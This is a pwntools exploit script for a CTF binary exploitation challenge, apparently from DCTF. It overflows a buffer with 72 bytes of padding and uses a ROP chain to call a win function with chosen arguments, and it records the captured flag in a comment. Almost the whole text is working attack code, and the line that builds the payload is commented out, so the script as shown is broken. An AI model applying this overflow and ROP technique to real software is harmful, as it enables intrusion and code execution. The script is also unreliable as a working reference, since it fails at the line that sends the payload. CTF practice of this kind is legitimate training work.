# here we use an ROP chain to pass arguments to the win_function
from pwn import *

filename  = "/home/saudi/Desktop/CTF/CTF scripts/Pwn/Pwn_sanity_check/pwn_sanity_check"

elf = context.binary = ELF(filename)
win_function = elf.symbols.win

# io = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)

io = process(elf.path) 
log.info(io.recvline())

rop = ROP(elf)
padding = b"A"*72
rop.call(win_function,[0xdeadbeef,0x1337c0de])

# exploit = padding+rop.chain()

log.info("Sending payload...")
io.sendline(exploit)
io.interactive()

# dctf{Ju5t_m0v3_0n}